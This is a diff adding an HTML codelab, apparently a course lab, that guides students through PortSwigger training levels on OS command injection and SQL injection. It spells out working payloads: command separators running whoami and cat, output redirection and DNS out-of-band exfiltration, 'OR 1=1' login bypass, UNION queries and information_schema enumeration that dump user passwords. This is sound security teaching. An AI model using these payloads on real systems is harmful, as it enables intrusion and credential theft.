@@ -1,0 +1,292 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>3.1: Command and SQL injection</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W3.1_cmd_sql_injection" title="3.1: Command and SQL injection" environment="web" feedback-link="https://docs.google.com/document/d/1kZtOhMjqnfVyNJK-rhJPxbJpZlX-C7uGa1mbwvwmIks">
+<google-codelab-step label="os-command-injection (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/os-command-injection/lab-simple" target="_blank">simple</a></h2>
+<p>Visit the site and navigate to a product. At the bottom of the page, there is a &#34;Check stock&#34; button which initiates a query that returns the inventory of the product. Bring up the Developer Tools on the product page, then click the &#34;Check stock&#34; button. Examine the network request, its headers and its form submission body. Identify the URL for the POST and the names of the fields in the form submission.</p>
+<p class="image-container"><img style="width:499px" src="img/c89836d03b57954f.png"></p>
+<p>We can recreate this request using a Python script similar to the one below. Fill in the missing parameters and run the script. Ensure that you obtain the same result.</p>
+<pre><code># &lt;FMI&gt; (Fill Me In) denotes a field you must modify
+s = requests.Session()
+stock_post_url = &lt;FMI&gt;
+post_data = {
+    &#39;&lt;FMI&gt;&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;&lt;FMI&gt;&#39; : &#39;&lt;FMI&gt;&#39;
+}
+resp = s.post(stock_post_url, data=post_data)
+print(resp.text)</code></pre>
+<p>The fields in this query are directly sent to an underlying operating system command, making the site vulnerable to an OS command injection attack. Using modifications to the script, attempt to use one of the command separators (e.g. a &#39;<code>;</code>&#39;, &#39;<code>|</code>&#39;, or other separators) to force the server to return the output of the <code>date</code> command back through the stock post.</p>
+<ul>
+<li><strong>Take a screenshot for your lab notebook of the output</strong></li>
+</ul>
+<p>Due to the simplicity of the level, one can also exploit it directly within Developer Tools. We will now repeat the exploit in order to exfiltrate the vulnerable shell script that we are injecting into. To begin with, right click the &#34;Check stock&#34; button and &#34;Inspect&#34; it. </p>
+<p class="image-container"><img style="width:398px" src="img/505ba1b930951b85.png"></p>
+<p>Then, in the form input fields, double-click the option value to append to the store identifier a semicolon that ends the command the value is used in followed by an <code>ls</code> command. Once modified, go back to the page and click the &#34;Check stock&#34; button to send the modified parameter. A directory listing should appear containing 2 files. Edit the option value again to instead run the <code>cat</code> command in order to return the contents of the shell script on the web page similar to that shown below</p>
+<p class="image-container"><img style="width:387px" src="img/6947f2f6ec16bcb9.png"></p>
+<ul>
+<li><strong>Take a screenshot for your lab notebook of the output</strong></li>
+</ul>
+<p>Finally, finish the level by running the command that identifies the <a href="https://linuxize.com/post/whoami-command-in-linux/" target="_blank">username</a> of the account running the web site. For your reference, a list of common commands for Linux and Windows is given below:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p><strong>Purpose of command</strong></p>
+</td><td colspan="1" rowspan="1"><p><strong>Linux</strong></p>
+</td><td colspan="1" rowspan="1"><p><strong>Windows</strong></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Name of current user</p>
+</td><td colspan="1" rowspan="1"><p><code>whoami</code></p>
+</td><td colspan="1" rowspan="1"><p><code>whoami</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Operating system</p>
+</td><td colspan="1" rowspan="1"><p><code>uname -a</code></p>
+</td><td colspan="1" rowspan="1"><p><code>ver</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Network configuration</p>
+</td><td colspan="1" rowspan="1"><p><code>ip</code></p>
+</td><td colspan="1" rowspan="1"><p><code>ipconfig /all</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Network connections</p>
+</td><td colspan="1" rowspan="1"><p><code>netstat -an</code></p>
+</td><td colspan="1" rowspan="1"><p><code>netstat -an</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Running processes</p>
+</td><td colspan="1" rowspan="1"><p><code>ps -ef</code></p>
+</td><td colspan="1" rowspan="1"><p><code>tasklist</code></p>
+</td></tr>
+</table>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="os-command-injection (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays" target="_blank">blind-time-delays</a></h2>
+<p>Web applications may be written in a way that the results of a command are not directly returned. &#39;Blind&#39; attacks allow an adversary to learn whether a web site contains a command injection vulnerability via other means. One way to do so is to inject a command that results in a delay in the processing of the request. For example, if one is able to successfully inject a &#39;<code>sleep 5</code>&#39;, the web application will pause for 5 seconds before returning a response, thus revealing that the application contains the vulnerability.</p>
+<p>In this level, the feedback form has a command injection vulnerability. To begin with, visit the web site and then visit the &#34;Submit feedback&#34; page. Bring up Developer Tools, fill out the form, and then submit it. In Developer Tools, examine the network request URL along with the form submission data that is sent. Click on the &#34;Response&#34; to see the two characters that are returned from the server upon a successful submission. </p>
+<p class="image-container"><img style="width:376px" src="img/a41b10e5cc99b16d.png"></p>
+<p>The Python script below can be adapted to submit this request as well. Modify the fields based on this request and run the script, ensuring you can properly post to the form with the same response.</p>
+<pre><code>s = requests.Session()
+feedback_url = &lt;FMI&gt;
+resp = s.get(feedback_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+feedback_submit_url = &lt;FMI&gt;
+post_data = {
+    &#39;csrf&#39; : csrf,
+    &#39;name&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;&lt;FMI&gt;&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;&lt;FMI&gt;&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;&lt;FMI&gt;&#39; : &#39;&lt;FMI&gt;&#39;
+}
+resp = s.post(feedback_submit_url, data=post_data)
+print(resp.text)</code></pre>
+<p>The e-mail field in the form submission is vulnerable to blind command injection. To demonstrate this, inject a 10-second <code>ping</code> command with the <code>-c</code> flag into the e-mail parameter. For this particular injection, you will need to employ the boolean || operator around the command to inject it successfully (e.g. <code>|| ping -c 10 127.0.0.1 ||</code> ). Submit the feedback to cause a delay on the server in order to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="os-command-injection (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection" target="_blank">blind-output-redirection</a></h2>
+<p>Another way to perform blind command injection is to use the injection to issue a command that writes to the file system. If an adversary can create a file within the web server that can then be subsequently downloaded or if the adversary can subsequently cause an error that results in sensitive data being sent to a log file that can be downloaded, data exfiltration can occur.</p>
+<p>For example, in the previous level, we performed a <code>ping</code> command, but did not save its output. One can use file system redirection in the shell (e.g. <code>></code>) to take the output of a command and put it in a web-accessible location. To solve the level, exfiltrate the username of the account running the web site by first executing the whoami command and redirecting it to a file in a directory from which images are served (e.g. <code>|| whoami > /var/www/images/output.txt ||</code> ). Then, access that file at ( <code>/image?filename=output.txt</code> )</p>
+<ul>
+<li><strong>What is the username that runs the site?</strong></li>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="os-command-injection (4)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band" target="_blank">blind-out-of-band</a></h2>
+<p>Similar to redirection to a file, an adversary can also trigger a network request that can be seen by the adversary. For example, if the attacker controls the domain <code>foo.com</code> and wants to exfiltrate a <code>password</code>, a request to <code>password.foo.com</code> will reveal it. This technique belongs to a general class of &#34;out-of-band&#34; attacks.</p>
+<p>Repeat the blind attack on the feedback submission form, but do so by injecting a command in the email parameter that triggers a name lookup on any subdomain of <code>burpcollaborator.net</code>. A successful lookup will automatically solve the level. In real life, an adversary would monitor the other end of the DNS request to pull the exfiltrated data out of the network. </p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank">retrieve-hidden-data</a></h2>
+<p>In SQL injection attacks, user input is used directly in the construction of a subsequent SQL query string sent to the database. The first step of any SQL injection attack is to identify the syntax being used to construct the SQL string and to break it. Strings are typically denoted in a programming language via the single-quote or the double-quote character. One of the strategies an automated scanning tool such as <a href="http://sqlmap.org/" target="_blank">sqlmap</a> will do is try out these characters all over a web application to see if anything breaks.</p>
+<p>In this level, we are given an example of the SQL statement that is used to query the backend database:</p>
+<pre>SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1</pre>
+<p>Note that the category string is denoted with single-quotes.</p>
+<p>Visit the level&#39;s web site and click on the <code>Gifts</code> category. Note that if the category does not exist on your level, you can replace <code>Gifts</code> with an alternate one for this and subsequent levels.</p>
+<p>View the category string that appears in the URL. The program below performs the same request as above. Note that for the category string we use triple double-quotes to denote the string so that we do not have to escape out the single-quote or double-quote characters when attempting to perform the SQL injection attack. Run the program and ensure you obtain the same output.</p>
+<pre><code>def try_category(category_string):
+    url = f&#39;https://{site}/filter?category={category_string}&#39;
+    resp = s.get(url)
+    print(resp.text)
+
+s = requests.Session()
+try_category(&#34;&#34;&#34;Gifts&#34;&#34;&#34;)</code></pre>
+<p>Go back to the web site and select the <code>Gifts</code> category. In the URL, replace <code>Gifts</code> with a double-quote character and load the resulting page.</p>
+<ul>
+<li><strong>Take a screenshot of the output.</strong></li>
+</ul>
+<p>Then, replace the category string with a single-quote character and load the resulting page.</p>
+<ul>
+<li><strong>What output is returned?</strong></li>
+</ul>
+<p>Re-run the Python script above using a single-quote character as the category to ensure you obtain the same output.</p>
+<pre><code>try_category(&#34;&#34;&#34;&#39;&#34;&#34;&#34;)</code></pre>
+<p>The canonical SQL injection attack breaks SQL query syntax and then uses a disjunction on a predicate that is always <code>True</code> to return all rows in a table. In this example, we can return all <code>Gifts</code> (not just the released ones) by performing sending the category <code>Gifts' OR 1=1 --</code> . The single-quote after the <code>Gifts</code> breaks the query string&#39;s syntax allowing the disjunction and the always <code>True</code> predicate (<code>OR 1=1</code>) to trigger to be included in the SQL query. This is followed by the comment characters for SQL (<code>--</code>) which causes the rest of the query string to be ignored by the backend (including the single-quote that closes the category string in the application itself). The statement that is then sent to the SQL database is shown below:</p>
+<pre>SELECT * FROM products WHERE category = &#39;Gifts&#39; OR 1=1 -- &#39; AND released = 1</pre>
+<p>Modify the Python script above with the appropriate string to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank">login-bypass</a></h2>
+<p>One of the more devastating uses for a SQL injection attack is to obtain unauthorized access to an account. This happens when the login form that implements authentication contains a SQL injection vulnerability. Visit the web site and go to the Login page.</p>
+<p>Using the method from the previous level, attempt to use either the single-quote or double-quote to break syntax on the two fields of the form. Answer the following questions:</p>
+<ul>
+<li><strong>Is the username field vulnerable to SQL injection? If so, what character breaks syntax?</strong></li>
+<li><strong>Is the password field vulnerable to SQL injection? If so, what character breaks syntax?</strong></li>
+</ul>
+<p>Using the Python script template below, modify it to log in as <code>administrator</code> with a password of <code>foo</code>. The code performs the login and then uses Python&#39;s walrus operator (<code>:=</code>) to check to see if the response has a &lt;<code>p</code>&gt; tag with an &#39;<code>is-warning</code>&#39; class in it. The walrus operator assigns the result to <code>warn</code> if so. The program then prints the text attached to <code>warn</code> if it exists. A successful login will not return this tag, causing the script to simply print the entire response. </p>
+<pre><code>s = requests.Session()
+url = f&#39;https://{site}/login&#39;
+
+resp = s.get(url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+logindata = {
+    &#39;csrf&#39; : csrf,
+    &#39;username&#39; : &#34;&#34;&#34;&lt;FMI&gt;&#34;&#34;&#34;,
+    &#39;password&#39; : &#34;&#34;&#34;&lt;FMI&gt;&#34;&#34;&#34;
+}
+
+resp = s.post(url, data=logindata)
+
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+
+if warn := soup.find(&#39;p&#39;, {&#39;class&#39;:&#39;is-warning&#39;}):
+    print(warn.text)
+else:
+    print(resp.text)</code></pre>
+<p>Modify the script to perform a SQL injection on the <code>username</code> field that allows you to login as the administrator user.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection/union-attacks (1)" duration="5">
+<p>A SQL injection vulnerability is a doorway that allows an adversary to pull arbitrary information out of the backend database. Key to an adversary&#39;s approach is the use of SQL&#39;s UNION keyword that instructs SQL to combine table results together.</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank">determine-number-of-columns</a></h2>
+<p>Tables can only be combined with the UNION keyword if they have an identical number of columns. For example, in the query below, the <code>*</code> denotes that all columns of the <code>products</code> table are returned in the query. If we wish to append another table to these results, we must ensure it has the same number of columns as the <code>products</code> table does. </p>
+<pre>SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1</pre>
+<p>This level can be solved by determining the number of columns in the <code>products</code> table via a brute-force attack that uses a UNION to create a table with a single row of <code>null</code>s as columns. This table is then appended to the original results. We can vary the number of columns in the table and observe which query succeeds to identify the number of columns in the <code>products</code> table. Adapt the Python script for injecting into the category string to run the following queries in order to determine the number of columns.</p>
+<pre>try_category(&#34;&#34;&#34;Gifts&#39; UNION SELECT null -- &#34;&#34;&#34;)
+try_category(&#34;&#34;&#34;Gifts&#39; UNION SELECT null,null -- &#34;&#34;&#34;)
+try_category(&#34;&#34;&#34;Gifts&#39; UNION SELECT null,null,null -- &#34;&#34;&#34;)
+try_category(&#34;&#34;&#34;Gifts&#39; UNION SELECT null,null,null,null -- &#34;&#34;&#34;)</pre>
+<ul>
+<li><strong>How many columns does the products table contain?</strong></li>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection/union-attacks (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank">find-column-containing-text</a></h2>
+<p>Because SQL schemas specify strongly typed data, when performing the UNION operation, the two tables must have compatible types in their columns. While in the previous level, we use <code>null</code> values that are compatible with all SQL data types, if we wish to retrieve actual data from the database via the UNION, we must make sure the types in the columns we select match. </p>
+<p>After determining the number of columns in a table, we can then use a brute-force attack via UNION queries to identify the data type of each column being returned in a particular query. Consider the UNION in the previous level and assume that the number of columns is 2. In order to test if the first column in the table has a string data type associated with it, we could inject the payload below and see if it returns <code>hello</code> as part of the results.</p>
+<pre>Gifts&#39; UNION SELECT &#39;hello&#39;,null --</pre>
+<p>Then, to test if the second column in the table has a string data type, we could inject the following instead and see if it returns <code>hello</code>.</p>
+<pre>Gifts&#39; UNION SELECT null,&#39;hello&#39; --</pre>
+<p>Using this technique, the level asks you to use the SQL injection to pass back a particular hint string. The hint can be retrieved via parsing the level&#39;s web site:</p>
+<pre><code>url= f&#39;https://{site}/&#39;
+resp = s.get(url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+hint_text = soup.find(id=&#39;hint&#39;).get_text().split(&#34;&#39;&#34;)[1]
+print(f&#34;Database needs to retrieve the string {hint_text}&#34;)</code></pre>
+<p>One can then use the code from the previous level, to then include the hint in subsequent queries:</p>
+<pre>&#39; UNION SELECT &#39;{hint_text}&#39;,null,null, ... --
+&#39; UNION SELECT null,&#39;{hint_text}&#39;,null, ... --
+&#39; UNION SELECT null,null,&#39;{hint_text}&#39;, ... --</pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection/union-attacks (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables" target="_blank">retrieve-data-from-other-tables</a></h2>
+<p>A SQL injection vulnerability is a doorway that allows an adversary to access arbitrary information from other tables. In the category example used previously, we have identified a column in the original query that contained a string. We can now perform a UNION on a different table to return its data alongside the product data. Consider a category query into the products table that only returns two columns containing strings: one for the product&#39;s <code>name</code> and one for the product&#39;s <code>description</code>. A SQL query to return all products might then contain:</p>
+<pre>SELECT name,description from products WHERE category = &#39;Gifts&#39;</pre>
+<p>If we wish the query to return all username and password values from the table users, we could perform an injection onto the category string that does so using the UNION. </p>
+<pre>&#39; UNION SELECT username,password from users -- </pre>
+<p>This leads to the query below being executed:</p>
+<pre>SELECT name,description from products WHERE category = &#39;Gifts&#39; UNION SELECT username,password from users --</pre>
+<p>Perform this injection to solve the level. Although it is easiest to pull out the administrator password manually, the Python code below parses the table that is returned and pulls out the administrator credentials automatically.</p>
+<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+user_table = soup.find(&#39;table&#39;).find_all(&#39;tr&#39;)
+admin_entry = [r.find(&#39;td&#39;).contents for r in user_table if &#39;administrator&#39; in r.find(&#39;th&#39;)]
+admin_password = admin_entry.pop().pop()</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection/examining-the-database (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank">querying-database-version-mysql-microsoft</a></h2>
+<p>An attacker will often perform reconnaissance on a backend database server to find the database software it is running and its version. Special database-specific directives in SQL can be used to return this information. In this case, the @@version directive will output this information. An example that you will need to modify is shown below. Note that a trailing space must be included after the comment character for MySQL database backends.</p>
+<pre>Gifts&#39; UNION SELECT @@version, ... -- </pre>
+<p>Modify this example to obtain the version of the database server that is running. </p>
+<ul>
+<li><strong>What is the version number of the database?</strong></li>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="sql-injection/examining-the-database (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank">listing-database-contents-non-oracle</a></h2>
+<p>One of the issues for the attacker in attempting to perform a SQL injection attack is discovering the names of the tables and columns in the database. Fortunately for attackers, database vendors often make it easy for them to discover this metadata information by implementing well-known tables containing global information about the database. On MySQL and Microsoft SQL servers, a metadata database called <code>information_schema</code> contains table and column information about what it stores. This can be leveraged to turn a simple SQL injection into a full account compromise.</p>
+<p>As before, we start with an injection vulnerability on the category parameter. Our first task is to probe the site to determine the number of columns in the underlying query that are returned as well as their data types. This allows us to target a UNION that returns a compatible table. </p>
+<pre>Gifts&#39; UNION SELECT null --
+Gifts&#39; UNION SELECT null,null -- </pre>
+<p>Once we obtain the number of columns, we can then attempt to perform a UNION that retrieves the names of tables (<code>table_name</code>) via the <code>information_schema.tables</code> table. For example, if the number of columns is 3 and the first column returned is known to be a string, the following query would list all of the table names on the server. Note that for clarity of output, we can drop the initial query string (<code>Gifts</code>).</p>
+<pre>&#39; UNION SELECT table_name,null,null from information_schema.tables --</pre>
+<p>Adapt the query to find the name of the users table in the database. You may use the Python snippet below to extract the name of the users table programmatically.</p>
+<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+user_table = soup.find(&#39;table&#39;).find(&#39;th&#39;,text=re.compile(&#39;^users&#39;)).text
+print(f&#34;Found user table of {user_table}&#34;)</code></pre>
+<ul>
+<li><strong>Take a screenshot of the results showing the name of the user table</strong></li>
+</ul>
+<p>While we now have the name of the user table, we now need to identify the column names for both the usernames and passwords in this table. This can be done by leveraging the <code>information_schema.columns</code> table. As before, if the vulnerable SQL query has 3 columns that are strings, the query below will then return the names of each column in the <code>user_table</code>.</p>
+<pre>&#39; UNION SELECT column_name,null,null from information_schema.columns WHERE table_name=&#39;{user_table}&#39; --</pre>
+<ul>
+<li><strong>Take a screenshot of the results showing the column names of the user table.</strong></li>
+</ul>
+<p>We can easily parse the column names from the output that is returned by the query.</p>
+<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+print(resp.text)
+username_col = soup.find(&#39;table&#39;).find(&#39;th&#39;,text=re.compile(&#39;^username&#39;)).text
+password_col = soup.find(&#39;table&#39;).find(&#39;th&#39;,text=re.compile(&#39;^password&#39;)).text
+print(f&#34;Found username column of {username_col}&#34;)
+print(f&#34;Found password column of {password_col}&#34;)</code></pre>
+<p>Now that we know the user table name and the names of its columns, we can now dump the entire database of users via a query similar to below:</p>
+<pre>&#39; UNION SELECT {username_col},{password_col} from {user_table} -- </pre>
+<ul>
+<li><strong>Take a screenshot of the results showing all of the users and their passwords for the site.</strong></li>
+</ul>
+<p>Then, use the administrator account to log in and complete the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
